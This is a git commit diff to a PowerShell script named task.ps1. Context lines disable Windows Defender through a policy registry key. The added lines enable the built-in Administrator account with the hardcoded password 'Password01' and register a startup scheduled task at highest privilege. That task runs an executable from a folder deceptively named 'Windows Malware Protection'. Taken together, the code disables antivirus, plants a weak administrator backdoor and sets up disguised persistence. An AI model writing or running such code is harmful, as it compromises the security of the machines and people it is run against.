eb1dcb9f9024e8fcd3d1e4527413e5f7665a5dc3
NoobleMcScrunchkin <kieranaslett@gmail.com>
2019-02-01 11:41:16 +0000

    Update task.ps1

--- task.ps1
+++ task.ps1
@@ -3,6 +3,10 @@ $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
 $Name = "DisableAntiSpyware"
 $value = "1"
 New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
-$trigger = New-JobTrigger -AtLogon
+net user Administrator /active:yes
+net user Administrator Password01
+$Username = (Get-WmiObject -Class Win32_ComputerSystem -Property Name).Name + "\Administrator"
+$Password = "Password01"
+$trigger = New-JobTrigger -AtStartup
 $action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
-Register-ScheduledTask -Action $action -Trigger $trigger -RunLevel Highest -TaskName "Windows Malware Protection"
+Register-ScheduledTask -Action $action -Trigger $trigger -RunLevel Highest -User $Username -Password $Password -TaskName "Windows Malware Protection"
